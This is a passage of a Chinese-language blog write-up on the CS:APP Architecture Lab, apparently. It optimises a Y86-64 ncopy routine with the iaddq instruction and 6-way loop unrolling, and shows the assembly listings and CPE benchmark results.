</span><span id=__span-103-9><a id=__codelineno-103-9 name=__codelineno-103-9></a><span class=w>    </span><span class=nf>rmmovq</span><span class=w> </span><span class=nv>%r10</span><span class=p>,</span><span class=w> </span><span class=p>(</span><span class=nv>%rsi</span><span class=p>)</span><span class=w> </span><span class=c1># ...and store it to dst</span>
</span><span id=__span-103-10><a id=__codelineno-103-10 name=__codelineno-103-10></a><span class=w>    </span><span class=nf>andq</span><span class=w> </span><span class=nv>%r10</span><span class=p>,</span><span class=w> </span><span class=nv>%r10</span><span class=w>     </span><span class=c1># val &lt;= 0?</span>
</span><span id=__span-103-11><a id=__codelineno-103-11 name=__codelineno-103-11></a><span class=w>    </span><span class=nf>jle</span><span class=w> </span><span class=no>Npos</span><span class=w>            </span><span class=c1># if so, goto Npos:</span>
</span><span id=__span-103-12><a id=__codelineno-103-12 name=__codelineno-103-12></a><span class=w>    </span><span class=nf>irmovq</span><span class=w> </span><span class=no>$1</span><span class=p>,</span><span class=w> </span><span class=nv>%r10</span>
</span><span id=__span-103-13><a id=__codelineno-103-13 name=__codelineno-103-13></a><span class=w>    </span><span class=nf>addq</span><span class=w> </span><span class=nv>%r10</span><span class=p>,</span><span class=w> </span><span class=nv>%rax</span><span class=w>     </span><span class=c1># count++</span>
</span><span id=__span-103-14><a id=__codelineno-103-14 name=__codelineno-103-14></a><span class=nl>Npos:</span><span class=w>   </span>
</span><span id=__span-103-15><a id=__codelineno-103-15 name=__codelineno-103-15></a><span class=w>    </span><span class=nf>irmovq</span><span class=w> </span><span class=no>$1</span><span class=p>,</span><span class=w> </span><span class=nv>%r10</span>
</span><span id=__span-103-16><a id=__codelineno-103-16 name=__codelineno-103-16></a><span class=w>    </span><span class=nf>subq</span><span class=w> </span><span class=nv>%r10</span><span class=p>,</span><span class=w> </span><span class=nv>%rdx</span><span class=w>     </span><span class=c1># len--</span>
</span><span id=__span-103-17><a id=__codelineno-103-17 name=__codelineno-103-17></a><span class=w>    </span><span class=nf>irmovq</span><span class=w> </span><span class=no>$8</span><span class=p>,</span><span class=w> </span><span class=nv>%r10</span>
</span><span id=__span-103-18><a id=__codelineno-103-18 name=__codelineno-103-18></a><span class=w>    </span><span class=nf>addq</span><span class=w> </span><span class=nv>%r10</span><span class=p>,</span><span class=w> </span><span class=nv>%rdi</span><span class=w>     </span><span class=c1># src++</span>
</span><span id=__span-103-19><a id=__codelineno-103-19 name=__codelineno-103-19></a><span class=w>    </span><span class=nf>addq</span><span class=w> </span><span class=nv>%r10</span><span class=p>,</span><span class=w> </span><span class=nv>%rsi</span><span class=w>     </span><span class=c1># dst++</span>
</span><span id=__span-103-20><a id=__codelineno-103-20 name=__codelineno-103-20></a><span class=w>    </span><span class=nf>andq</span><span class=w> </span><span class=nv>%rdx</span><span class=p>,</span><span class=nv>%rdx</span><span class=w>      </span><span class=c1># len &gt; 0?</span>
</span><span id=__span-103-21><a id=__codelineno-103-21 name=__codelineno-103-21></a><span class=w>    </span><span class=nf>jg</span><span class=w> </span><span class=no>Loop</span><span class=w>             </span><span class=c1># if so, goto Loop:</span>
</span></code></pre></div></td></tr></table></div> <p>先分别执行以下命令，对原始代码测试一波 CPE：</p> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-104-1>1</a></span>
<span class=normal><a href=#__codelineno-104-2>2</a></span>
<span class=normal><a href=#__codelineno-104-3>3</a></span>
<span class=normal><a href=#__codelineno-104-4>4</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-104-1><a id=__codelineno-104-1 name=__codelineno-104-1></a>pipe$<span class=w> </span>./correctness.pl
</span><span id=__span-104-2><a id=__codelineno-104-2 name=__codelineno-104-2></a>pipe$<span class=w> </span>./benchmark.pl
</span><span id=__span-104-3><a id=__codelineno-104-3 name=__codelineno-104-3></a>Average<span class=w> </span>CPE<span class=w>     </span><span class=m>15</span>.18
</span><span id=__span-104-4><a id=__codelineno-104-4 name=__codelineno-104-4></a>Score<span class=w>   </span><span class=m>0</span>.0/60.0
</span></code></pre></div></td></tr></table></div> <h4 id=iaddq>利用iaddq<a class=headerlink href=#iaddq title="Permanent link">¶</a></h4> <p>首先能够直观看到，为了<code>len--</code>/<code>src++</code>/<code>dst++</code>等操作，原代码对<code>%rdi</code>进行了不少次赋值操作，这些都可以用我们新增的iaddq指令替代。替代后代码为：</p> <div class="language-asm highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-105-1> 1</a></span>
<span class=normal><a href=#__codelineno-105-2> 2</a></span>
<span class=normal><a href=#__codelineno-105-3> 3</a></span>
<span class=normal><a href=#__codelineno-105-4> 4</a></span>
<span class=normal><a href=#__codelineno-105-5> 5</a></span>
<span class=normal><a href=#__codelineno-105-6> 6</a></span>
<span class=normal><a href=#__codelineno-105-7> 7</a></span>
<span class=normal><a href=#__codelineno-105-8> 8</a></span>
<span class=normal><a href=#__codelineno-105-9> 9</a></span>
<span class=normal><a href=#__codelineno-105-10>10</a></span>
<span class=normal><a href=#__codelineno-105-11>11</a></span>
<span class=normal><a href=#__codelineno-105-12>12</a></span>
<span class=normal><a href=#__codelineno-105-13>13</a></span>
<span class=normal><a href=#__codelineno-105-14>14</a></span>
<span class=normal><a href=#__codelineno-105-15>15</a></span>
<span class=normal><a href=#__codelineno-105-16>16</a></span>
<span class=normal><a href=#__codelineno-105-17>17</a></span>
<span class=normal><a href=#__codelineno-105-18>18</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-105-1><a id=__codelineno-105-1 name=__codelineno-105-1></a><span class=c1># You can modify this portion</span>
</span><span id=__span-105-2><a id=__codelineno-105-2 name=__codelineno-105-2></a><span class=w>    </span><span class=c1># Loop header</span>
</span><span id=__span-105-3><a id=__codelineno-105-3 name=__codelineno-105-3></a><span class=w>    </span><span class=nf>xorq</span><span class=w> </span><span class=nv>%rax</span><span class=p>,</span><span class=nv>%rax</span><span class=w>      </span><span class=c1># count = 0;</span>
</span><span id=__span-105-4><a id=__codelineno-105-4 name=__codelineno-105-4></a><span class=w>    </span><span class=nf>andq</span><span class=w> </span><span class=nv>%rdx</span><span class=p>,</span><span class=nv>%rdx</span><span class=w>      </span><span class=c1># len &lt;= 0?</span>
</span><span id=__span-105-5><a id=__codelineno-105-5 name=__codelineno-105-5></a><span class=w>    </span><span class=nf>jle</span><span class=w> </span><span class=no>Done</span><span class=w>            </span><span class=c1># if so, goto Done:</span>
</span><span id=__span-105-6><a id=__codelineno-105-6 name=__codelineno-105-6></a>
</span><span id=__span-105-7><a id=__codelineno-105-7 name=__codelineno-105-7></a><span class=nl>Loop:</span><span class=w>   </span>
</span><span id=__span-105-8><a id=__codelineno-105-8 name=__codelineno-105-8></a><span class=w>    </span><span class=nf>mrmovq</span><span class=w> </span><span class=p>(</span><span class=nv>%rdi</span><span class=p>),</span><span class=w> </span><span class=nv>%r10</span><span class=w> </span><span class=c1># read val from src...</span>
</span><span id=__span-105-9><a id=__codelineno-105-9 name=__codelineno-105-9></a><span class=w>    </span><span class=nf>rmmovq</span><span class=w> </span><span class=nv>%r10</span><span class=p>,</span><span class=w> </span><span class=p>(</span><span class=nv>%rsi</span><span class=p>)</span><span class=w> </span><span class=c1># ...and store it to dst</span>
</span><span id=__span-105-10><a id=__codelineno-105-10 name=__codelineno-105-10></a><span class=w>    </span><span class=nf>andq</span><span class=w> </span><span class=nv>%r10</span><span class=p>,</span><span class=w> </span><span class=nv>%r10</span><span class=w>     </span><span class=c1># val &lt;= 0?</span>
</span><span id=__span-105-11><a id=__codelineno-105-11 name=__codelineno-105-11></a><span class=w>    </span><span class=nf>jle</span><span class=w> </span><span class=no>Npos</span><span class=w>            </span><span class=c1># if so, goto Npos:</span>
</span><span id=__span-105-12><a id=__codelineno-105-12 name=__codelineno-105-12></a><span class=w>    </span><span class=nf>iaddq</span><span class=w> </span><span class=no>$1</span><span class=p>,</span><span class=w> </span><span class=nv>%rax</span><span class=w>      </span><span class=c1># count++</span>
</span><span id=__span-105-13><a id=__codelineno-105-13 name=__codelineno-105-13></a><span class=nl>Npos:</span><span class=w>   </span>
</span><span id=__span-105-14><a id=__codelineno-105-14 name=__codelineno-105-14></a><span class=w>    </span><span class=nf>iaddq</span><span class=w> </span><span class=no>$-1</span><span class=p>,</span><span class=w> </span><span class=nv>%rdx</span><span class=w>     </span><span class=c1># len--</span>
</span><span id=__span-105-15><a id=__codelineno-105-15 name=__codelineno-105-15></a><span class=w>    </span><span class=nf>iaddq</span><span class=w> </span><span class=no>$8</span><span class=p>,</span><span class=w> </span><span class=nv>%rdi</span><span class=w>      </span><span class=c1># src++</span>
</span><span id=__span-105-16><a id=__codelineno-105-16 name=__codelineno-105-16></a><span class=w>    </span><span class=nf>iaddq</span><span class=w> </span><span class=no>$8</span><span class=p>,</span><span class=w> </span><span class=nv>%rsi</span><span class=w>      </span><span class=c1># dst++</span>
</span><span id=__span-105-17><a id=__codelineno-105-17 name=__codelineno-105-17></a><span class=w>    </span><span class=nf>andq</span><span class=w> </span><span class=nv>%rdx</span><span class=p>,</span><span class=nv>%rdx</span><span class=w>      </span><span class=c1># len &gt; 0?</span>
</span><span id=__span-105-18><a id=__codelineno-105-18 name=__codelineno-105-18></a><span class=w>    </span><span class=nf>jg</span><span class=w> </span><span class=no>Loop</span><span class=w>             </span><span class=c1># if so, goto Loop:</span>
</span></code></pre></div></td></tr></table></div> <p>CPE得到一些提升：</p> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-106-1>1</a></span>
<span class=normal><a href=#__codelineno-106-2>2</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-106-1><a id=__codelineno-106-1 name=__codelineno-106-1></a>Average<span class=w> </span>CPE<span class=w>     </span><span class=m>12</span>.70
</span><span id=__span-106-2><a id=__codelineno-106-2 name=__codelineno-106-2></a>Score<span class=w>   </span><span class=m>0</span>.0/60.0
</span></code></pre></div></td></tr></table></div> <h4 id=_2>循环展开<a class=headerlink href=#_2 title="Permanent link">¶</a></h4> <p>n路循环展开通过增加每次迭代计算的元素的数量，减少循环的迭代次数来提升效率：</p> <ul> <li>循环迭代次数减少：原始循环需要执行len次迭代，而n路展开后只需要执行约len/n 次迭代</li> <li>减少条件分支指令：每次迭代只需要进行一次循环条件检查，而不是n次</li> <li>降低分支预测失败率：循环次数减少意味着条件跳转指令减少，降低了流水线停顿的可能性</li> </ul> <p>选择进行6路展开：（测试后发现，6路展开效果最好）</p> <div class="language-asm highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-107-1> 1</a></span>
<span class=normal><a href=#__codelineno-107-2> 2</a></span>
<span class=normal><a href=#__codelineno-107-3> 3</a></span>
<span class=normal><a href=#__codelineno-107-4> 4</a></span>
<span class=normal><a href=#__codelineno-107-5> 5</a></span>
<span class=normal><a href=#__codelineno-107-6> 6</a></span>
<span class=normal><a href=#__codelineno-107-7> 7</a></span>
<span class=normal><a href=#__codelineno-107-8> 8</a></span>
<span class=normal><a href=#__codelineno-107-9> 9</a></span>
<span class=normal><a href=#__codelineno-107-10>10</a></span>
<span class=normal><a href=#__codelineno-107-11>11</a></span>
<span class=normal><a href=#__codelineno-107-12>12</a></span>
<span class=normal><a href=#__codelineno-107-13>13</a></span>
<span class=normal><a href=#__codelineno-107-14>14</a></span>
<span class=normal><a href=#__codelineno-107-15>15</a></span>
<span class=normal><a href=#__codelineno-107-16>16</a></span>
<span class=normal><a href=#__codelineno-107-17>17</a></span>
<span class=normal><a href=#__codelineno-107-18>18</a></span>
<span class=normal><a href=#__codelineno-107-19>19</a></span>
<span class=normal><a href=#__codelineno-107-20>20</a></span>
<span class=normal><a href=#__codelineno-107-21>21</a></span>
<span class=normal><a href=#__codelineno-107-22>22</a></span>
<span class=normal><a href=#__codelineno-107-23>23</a></span>
<span class=normal><a href=#__codelineno-107-24>24</a></span>
<span class=normal><a href=#__codelineno-107-25>25</a></span>
<span class=normal><a href=#__codelineno-107-26>26</a></span>
<span class=normal><a href=#__codelineno-107-27>27</a></span>
<span class=normal><a href=#__codelineno-107-28>28</a></span>
<span class=normal><a href=#__codelineno-107-29>29</a></span>
<span class=normal><a href=#__codelineno-107-30>30</a></span>
<span class=normal><a href=#__codelineno-107-31>31</a></span>
<span class=normal><a href=#__codelineno-107-32>32</a></span>
<span class=normal><a href=#__codelineno-107-33>33</a></span>
<span class=normal><a href=#__codelineno-107-34>34</a></span>
<span class=normal><a href=#__codelineno-107-35>35</a></span>
<span class=normal><a href=#__codelineno-107-36>36</a></span>
<span class=normal><a href=#__codelineno-107-37>37</a></span>
<span class=normal><a href=#__codelineno-107-38>38</a></span>
<span class=normal><a href=#__codelineno-107-39>39</a></span>
<span class=normal><a href=#__codelineno-107-40>40</a></span>
<span class=normal><a href=#__codelineno-107-41>41</a></span>
<span class=normal><a href=#__codelineno-107-42>42</a></span>
<span class=normal><a href=#__codelineno-107-43>43</a></span>
<span class=normal><a href=#__codelineno-107-44>44</a></span>
<span class=normal><a href=#__codelineno-107-45>45</a></span>
<span class=normal><a href=#__codelineno-107-46>46</a></span>
<span class=normal><a href=#__codelineno-107-47>47</a></span>
<span class=normal><a href=#__codelineno-107-48>48</a></span>
<span class=normal><a href=#__codelineno-107-49>49</a></span>
<span class=normal><a href=#__codelineno-107-50>50</a></span>
<span class=normal><a href=#__codelineno-107-51>51</a></span>
<span class=normal><a href=#__codelineno-107-52>52</a></span>
<span class=normal><a href=#__codelineno-107-53>53</a></span>
<span class=normal><a href=#__codelineno-107-54>54</a></span>
<span class=normal><a href=#__codelineno-107-55>55</a></span>
<span class=normal><a href=#__codelineno-107-56>56</a></span>
<span class=normal><a href=#__codelineno-107-57>57</a></span>
<span class=normal><a href=#__codelineno-107-58>58</a></span>
<span class=normal><a href=#__codelineno-107-59>59</a></span>
<span class=normal><a href=#__codelineno-107-60>60</a></span>
<span class=normal><a href=#__codelineno-107-61>61</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-107-1><a id=__codelineno-107-1 name=__codelineno-107-1></a><span class=c1># 函数签名：ncopy(src, dst, len)</span>
</span><span id=__span-107-2><a id=__codelineno-107-2 name=__codelineno-107-2></a><span class=c1># %rdi = src, %rsi = dst, %rdx = len</span>
</span><span id=__span-107-3><a id=__codelineno-107-3 name=__codelineno-107-3></a><span class=c1># Loop header</span>
</span><span id=__span-107-4><a id=__codelineno-107-4 name=__codelineno-107-4></a><span class=w>    </span><span class=nf>andq</span><span class=w> </span><span class=nv>%rdx</span><span class=p>,</span><span class=nv>%rdx</span><span class=w>      </span><span class=c1># len &lt;= 0?</span>
</span><span id=__span-107-5><a id=__codelineno-107-5 name=__codelineno-107-5></a><span class=w>    </span><span class=nf>jmp</span><span class=w> </span><span class=no>test</span>
</span><span id=__span-107-6><a id=__codelineno-107-6 name=__codelineno-107-6></a><span class=nl>Loop:</span>
</span><span id=__span-107-7><a id=__codelineno-107-7 name=__codelineno-107-7></a><span class=w>    </span><span class=nf>mrmovq</span><span class=w> </span><span class=p>(</span><span class=nv>%rdi</span><span class=p>),</span><span class=nv>%r8</span><span class=w>   </span><span class=c1># 从源读取第1个word到%r8</span>
</span><span id=__span-107-8><a id=__codelineno-107-8 name=__codelineno-107-8></a><span class=w>    </span><span class=nf>rmmovq</span><span class=w> </span><span class=nv>%r8</span><span class=p>,(</span><span class=nv>%rsi</span><span class=p>)</span><span class=w>   </span><span class=c1># 写入第1个word到dst</span>
</span><span id=__span-107-9><a id=__codelineno-107-9 name=__codelineno-107-9></a><span class=w>    </span><span class=nf>andq</span><span class=w> </span><span class=nv>%r8</span><span class=p>,</span><span class=nv>%r8</span><span class=w>        </span><span class=c1># val &lt;= 0?</span>
</span><span id=__span-107-10><a id=__codelineno-107-10 name=__codelineno-107-10></a><span class=w>    </span><span class=nf>jle</span><span class=w> </span><span class=no>Loop1</span><span class=w>           </span><span class=c1># 如果val &lt;= 0，goto Loop1</span>
</span><span id=__span-107-11><a id=__codelineno-107-11 name=__codelineno-107-11></a><span class=w>    </span><span class=nf>iaddq</span><span class=w> </span><span class=no>$1</span><span class=p>,</span><span class=nv>%rax</span><span class=w>       </span><span class=c1># 如果val &gt; 0，count++</span>
</span><span id=__span-107-12><a id=__codelineno-107-12 name=__codelineno-107-12></a><span class=nl>Loop1:</span>
</span><span id=__span-107-13><a id=__codelineno-107-13 name=__codelineno-107-13></a><span class=w>    </span><span class=nf>mrmovq</span><span class=w> </span><span class=mi>8</span><span class=p>(</span><span class=nv>%rdi</span><span class=p>),</span><span class=nv>%r8</span><span class=w>  </span><span class=c1># 从源读取第2个word到%r8</span>
</span><span id=__span-107-14><a id=__codelineno-107-14 name=__codelineno-107-14></a><span class=w>    </span><span class=nf>rmmovq</span><span class=w> </span><span class=nv>%r8</span><span class=p>,</span><span class=mi>8</span><span class=p>(</span><span class=nv>%rsi</span><span class=p>)</span>
</span><span id=__span-107-15><a id=__codelineno-107-15 name=__codelineno-107-15></a><span class=w>    </span><span class=nf>andq</span><span class=w> </span><span class=nv>%r8</span><span class=p>,</span><span class=nv>%r8</span>
</span><span id=__span-107-16><a id=__codelineno-107-16 name=__codelineno-107-16></a><span class=w>    </span><span class=nf>jle</span><span class=w> </span><span class=no>Loop2</span>
</span><span id=__span-107-17><a id=__codelineno-107-17 name=__codelineno-107-17></a><span class=w>    </span><span class=nf>iaddq</span><span class=w> </span><span class=no>$1</span><span class=p>,</span><span class=nv>%rax</span>
</span><span id=__span-107-18><a id=__codelineno-107-18 name=__codelineno-107-18></a><span class=nl>Loop2:</span>
</span><span id=__span-107-19><a id=__codelineno-107-19 name=__codelineno-107-19></a><span class=w>    </span><span class=nf>mrmovq</span><span class=w> </span><span class=mi>16</span><span class=p>(</span><span class=nv>%rdi</span><span class=p>),</span><span class=nv>%r8</span>
</span><span id=__span-107-20><a id=__codelineno-107-20 name=__codelineno-107-20></a><span class=w>    </span><span class=nf>rmmovq</span><span class=w> </span><span class=nv>%r8</span><span class=p>,</span><span class=mi>16</span><span class=p>(</span><span class=nv>%rsi</span><span class=p>)</span>
</span><span id=__span-107-21><a id=__codelineno-107-21 name=__codelineno-107-21></a><span class=w>    </span><span class=nf>andq</span><span class=w> </span><span class=nv>%r8</span><span class=p>,</span><span class=nv>%r8</span>
</span><span id=__span-107-22><a id=__codelineno-107-22 name=__codelineno-107-22></a><span class=w>    </span><span class=nf>jle</span><span class=w> </span><span class=no>Loop3</span>
</span><span id=__span-107-23><a id=__codelineno-107-23 name=__codelineno-107-23></a><span class=w>    </span><span class=nf>iaddq</span><span class=w> </span><span class=no>$1</span><span class=p>,</span><span class=nv>%rax</span>
</span><span id=__span-107-24><a id=__codelineno-107-24 name=__codelineno-107-24></a><span class=nl>Loop3:</span>
</span><span id=__span-107-25><a id=__codelineno-107-25 name=__codelineno-107-25></a><span class=w>    </span><span class=nf>mrmovq</span><span class=w> </span><span class=mi>24</span><span class=p>(</span><span class=nv>%rdi</span><span class=p>),</span><span class=nv>%r8</span>
</span><span id=__span-107-26><a id=__codelineno-107-26 name=__codelineno-107-26></a><span class=w>    </span><span class=nf>rmmovq</span><span class=w> </span><span class=nv>%r8</span><span class=p>,</span><span class=mi>24</span><span class=p>(</span><span class=nv>%rsi</span><span class=p>)</span>
</span><span id=__span-107-27><a id=__codelineno-107-27 name=__codelineno-107-27></a><span class=w>    </span><span class=nf>andq</span><span class=w> </span><span class=nv>%r8</span><span class=p>,</span><span class=nv>%r8</span>
</span><span id=__span-107-28><a id=__codelineno-107-28 name=__codelineno-107-28></a><span class=w>    </span><span class=nf>jle</span><span class=w> </span><span class=no>Loop4</span>
</span><span id=__span-107-29><a id=__codelineno-107-29 name=__codelineno-107-29></a><span class=w>    </span><span class=nf>iaddq</span><span class=w> </span><span class=no>$1</span><span class=p>,</span><span class=nv>%rax</span>
</span><span id=__span-107-30><a id=__codelineno-107-30 name=__codelineno-107-30></a><span class=nl>Loop4:</span>
</span><span id=__span-107-31><a id=__codelineno-107-31 name=__codelineno-107-31></a><span class=w>    </span><span class=nf>mrmovq</span><span class=w> </span><span class=mi>32</span><span class=p>(</span><span class=nv>%rdi</span><span class=p>),</span><span class=nv>%r8</span>
</span><span id=__span-107-32><a id=__codelineno-107-32 name=__codelineno-107-32></a><span class=w>    </span><span class=nf>rmmovq</span><span class=w> </span><span class=nv>%r8</span><span class=p>,</span><span class=mi>32</span><span class=p>(</span><span class=nv>%rsi</span><span class=p>)</span>
</span><span id=__span-107-33><a id=__codelineno-107-33 name=__codelineno-107-33></a><span class=w>    </span><span class=nf>andq</span><span class=w> </span><span class=nv>%r8</span><span class=p>,</span><span class=nv>%r8</span>
</span><span id=__span-107-34><a id=__codelineno-107-34 name=__codelineno-107-34></a><span class=w>    </span><span class=nf>jle</span><span class=w> </span><span class=no>Loop5</span>
</span><span id=__span-107-35><a id=__codelineno-107-35 name=__codelineno-107-35></a><span class=w>    </span><span class=nf>iaddq</span><span class=w> </span><span class=no>$1</span><span class=p>,</span><span class=nv>%rax</span>
</span><span id=__span-107-36><a id=__codelineno-107-36 name=__codelineno-107-36></a><span class=nl>Loop5:</span>
</span><span id=__span-107-37><a id=__codelineno-107-37 name=__codelineno-107-37></a><span class=w>    </span><span class=nf>mrmovq</span><span class=w> </span><span class=mi>40</span><span class=p>(</span><span class=nv>%rdi</span><span class=p>),</span><span class=nv>%r8</span>
</span><span id=__span-107-38><a id=__codelineno-107-38 name=__codelineno-107-38></a><span class=w>    </span><span class=nf>rmmovq</span><span class=w> </span><span class=nv>%r8</span><span class=p>,</span><span class=mi>40</span><span class=p>(</span><span class=nv>%rsi</span><span class=p>)</span>
</span><span id=__span-107-39><a id=__codelineno-107-39 name=__codelineno-107-39></a><span class=w>    </span><span class=nf>iaddq</span><span class=w> </span><span class=no>$48</span><span class=p>,</span><span class=nv>%rdi</span>
</span><span id=__span-107-40><a id=__codelineno-107-40 name=__codelineno-107-40></a><span class=w>    </span><span class=nf>iaddq</span><span class=w> </span><span class=no>$48</span><span class=p>,</span><span class=nv>%rsi</span>
</span><span id=__span-107-41><a id=__codelineno-107-41 name=__codelineno-107-41></a><span class=w>    </span><span class=nf>andq</span><span class=w> </span><span class=nv>%r8</span><span class=p>,</span><span class=nv>%r8</span>
</span><span id=__span-107-42><a id=__codelineno-107-42 name=__codelineno-107-42></a><span class=w>    </span><span class=nf>jle</span><span class=w> </span><span class=no>test</span>
</span><span id=__span-107-43><a id=__codelineno-107-43 name=__codelineno-107-43></a><span class=w>    </span><span class=nf>iaddq</span><span class=w> </span><span class=no>$1</span><span class=p>,</span><span class=nv>%rax</span><span class=w>   </span>
</span><span id=__span-107-44><a id=__codelineno-107-44 name=__codelineno-107-44></a><span class=no>test</span><span class=p>:</span>
</span><span id=__span-107-45><a id=__codelineno-107-45 name=__codelineno-107-45></a><span class=w>    </span><span class=nf>iaddq</span><span class=w> </span><span class=no>$-6</span><span class=p>,</span><span class=w> </span><span class=nv>%rdx</span><span class=w>         </span><span class=c1># 先减，判断够不够6个</span>
</span><span id=__span-107-46><a id=__codelineno-107-46 name=__codelineno-107-46></a><span class=w>    </span><span class=nf>jge</span><span class=w> </span><span class=no>Loop</span><span class=w>                </span><span class=c1># 6路展开</span>
</span><span id=__span-107-47><a id=__codelineno-107-47 name=__codelineno-107-47></a><span class=w>    </span><span class=nf>iaddq</span><span class=w> </span><span class=no>$-8</span><span class=p>,</span><span class=nv>%rdi</span><span class=w>          </span>
</span><span id=__span-107-48><a id=__codelineno-107-48 name=__codelineno-107-48></a><span class=w>    </span><span class=no>iaddq</span><span class=w> </span><span class=no>$-8</span><span class=p>,</span><span class=nv>%rsi</span><span class=w>          </span>
</span><span id=__span-107-49><a id=__codelineno-107-49 name=__codelineno-107-49></a><span class=w>    </span><span class=no>iaddq</span><span class=w> </span><span class=no>$6</span><span class=p>,</span><span class=w> </span><span class=nv>%rdx</span><span class=w>          </span><span class=c1># 恢复%rdx，因为不足6个word的时候前面先-6了，所以这里加回来</span>
</span><span id=__span-107-50><a id=__codelineno-107-50 name=__codelineno-107-50></a><span class=w>    </span><span class=nf>jmp</span><span class=w> </span><span class=no>test2</span><span class=w>               </span><span class=c1># 剩下的</span>
</span><span id=__span-107-51><a id=__codelineno-107-51 name=__codelineno-107-51></a><span class=nl>Lore:</span>
</span><span id=__span-107-52><a id=__codelineno-107-52 name=__codelineno-107-52></a><span class=w>    </span><span class=nf>mrmovq</span><span class=w> </span><span class=p>(</span><span class=nv>%rdi</span><span class=p>),</span><span class=nv>%r8</span>
</span><span id=__span-107-53><a id=__codelineno-107-53 name=__codelineno-107-53></a><span class=w>    </span><span class=nf>rmmovq</span><span class=w> </span><span class=nv>%r8</span><span class=p>,(</span><span class=nv>%rsi</span><span class=p>)</span>
</span><span id=__span-107-54><a id=__codelineno-107-54 name=__codelineno-107-54></a><span class=w>    </span><span class=nf>andq</span><span class=w> </span><span class=nv>%r8</span><span class=p>,</span><span class=nv>%r8</span>
</span><span id=__span-107-55><a id=__codelineno-107-55 name=__codelineno-107-55></a><span class=w>    </span><span class=nf>jle</span><span class=w> </span><span class=no>test2</span>
</span><span id=__span-107-56><a id=__codelineno-107-56 name=__codelineno-107-56></a><span class=w>    </span><span class=nf>iaddq</span><span class=w> </span><span class=no>$1</span><span class=p>,</span><span class=nv>%rax</span>
</span><span id=__span-107-57><a id=__codelineno-107-57 name=__codelineno-107-57></a><span class=nl>test2:</span>
</span><span id=__span-107-58><a id=__codelineno-107-58 name=__codelineno-107-58></a><span class=w>    </span><span class=nf>iaddq</span><span class=w> </span><span class=no>$8</span><span class=p>,</span><span class=nv>%rdi</span>
</span><span id=__span-107-59><a id=__codelineno-107-59 name=__codelineno-107-59></a><span class=w>    </span><span class=nf>iaddq</span><span class=w> </span><span class=no>$8</span><span class=p>,</span><span class=nv>%rsi</span>
</span><span id=__span-107-60><a id=__codelineno-107-60 name=__codelineno-107-60></a><span class=w>    </span><span class=nf>iaddq</span><span class=w> </span><span class=no>$-1</span><span class=p>,</span><span class=w> </span><span class=nv>%rdx</span>
</span><span id=__span-107-61><a id=__codelineno-107-61 name=__codelineno-107-61></a><span class=w>    </span><span class=nf>jge</span><span class=w> </span><span class=no>Lore</span>
</span></code></pre></div></td></tr></table></div> <h4 id=_3>剩余数据处理<a class=headerlink href=#_3 title="Permanent link">¶</a></h4> <p>对于剩余数据，选择3路循环展开。前面的6路与上面代码一样，就不再贴出来了：</p> <div class="language-asm highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-108-1> 1</a></span>
<span class=normal><a href=#__codelineno-108-2> 2</a></span>
<span class=normal><a href=#__codelineno-108-3> 3</a></span>
<span class=normal><a href=#__codelineno-108-4> 4</a></span>
<span class=normal><a href=#__codelineno-108-5> 5</a></span>
<span class=normal><a href=#__codelineno-108-6> 6</a></span>
<span class=normal><a href=#__codelineno-108-7> 7</a></span>
<span class=normal><a href=#__codelineno-108-8> 8</a></span>
<span class=normal><a href=#__codelineno-108-9> 9</a></span>
<span class=normal><a href=#__codelineno-108-10>10</a></span>
<span class=normal><a href=#__codelineno-108-11>11</a></span>
<span class=normal><a href=#__codelineno-108-12>12</a></span>
<span class=normal><a href=#__codelineno-108-13>13</a></span>
<span class=normal><a href=#__codelineno-108-14>14</a></span>
<span class=normal><a href=#__codelineno-108-15>15</a></span>
<span class=normal><a href=#__codelineno-108-16>16</a></span>
<span class=normal><a href=#__codelineno-108-17>17</a></span>
<span class=normal><a href=#__codelineno-108-18>18</a></span>
<span class=normal><a href=#__codelineno-108-19>19</a></span>
<span class=normal><a href=#__codelineno-108-20>20</a></span>
<span class=normal><a href=#__codelineno-108-21>21</a></span>
<span class=normal><a href=#__codelineno-108-22>22</a></span>
<span class=normal><a href=#__codelineno-108-23>23</a></span>
<span class=normal><a href=#__codelineno-108-24>24</a></span>
<span class=normal><a href=#__codelineno-108-25>25</a></span>
<span class=normal><a href=#__codelineno-108-26>26</a></span>
<span class=normal><a href=#__codelineno-108-27>27</a></span>
<span class=normal><a href=#__codelineno-108-28>28</a></span>
<span class=normal><a href=#__codelineno-108-29>29</a></span>
<span class=normal><a href=#__codelineno-108-30>30</a></span>
<span class=normal><a href=#__codelineno-108-31>31</a></span>
<span class=normal><a href=#__codelineno-108-32>32</a></span>
<span class=normal><a href=#__codelineno-108-33>33</a></span>
<span class=normal><a href=#__codelineno-108-34>34</a></span>
<span class=normal><a href=#__codelineno-108-35>35</a></span>
<span class=normal><a href=#__codelineno-108-36>36</a></span>
<span class=normal><a href=#__codelineno-108-37>37</a></span>
<span class=normal><a href=#__codelineno-108-38>38</a></span>
<span class=normal><a href=#__codelineno-108-39>39</a></span>
<span class=normal><a href=#__codelineno-108-40>40</a></span>
<span class=normal><a href=#__codelineno-108-41>41</a></span>
<span class=normal><a href=#__codelineno-108-42>42</a></span>
<span class=normal><a href=#__codelineno-108-43>43</a></span>
<span class=normal><a href=#__codelineno-108-44>44</a></span>
<span class=normal><a href=#__codelineno-108-45>45</a></span>
<span class=normal><a href=#__codelineno-108-46>46</a></span>
<span class=normal><a href=#__codelineno-108-47>47</a></span>
<span class=normal><a href=#__codelineno-108-48>48</a></span>
<span class=normal><a href=#__codelineno-108-49>49</a></span>
<span class=normal><a href=#__codelineno-108-50>50</a></span>
<span class=normal><a href=#__codelineno-108-51>51</a></span>
<span class=normal><a href=#__codelineno-108-52>52</a></span>
<span class=normal><a href=#__codelineno-108-53>53</a></span>
<span class=normal><a href=#__codelineno-108-54>54</a></span>
